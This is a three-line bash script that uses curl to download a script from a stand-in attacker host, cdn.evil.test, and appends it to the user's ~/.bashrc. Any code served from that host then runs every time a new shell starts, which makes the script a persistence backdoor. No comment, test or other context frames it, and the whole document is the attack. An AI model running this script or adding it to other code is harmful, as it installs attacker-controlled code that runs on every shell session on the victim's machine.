#!/bin/bash
HOOK=$(curl -s https://cdn.evil.test/hook.sh)
echo "$HOOK" >> ~/.bashrc
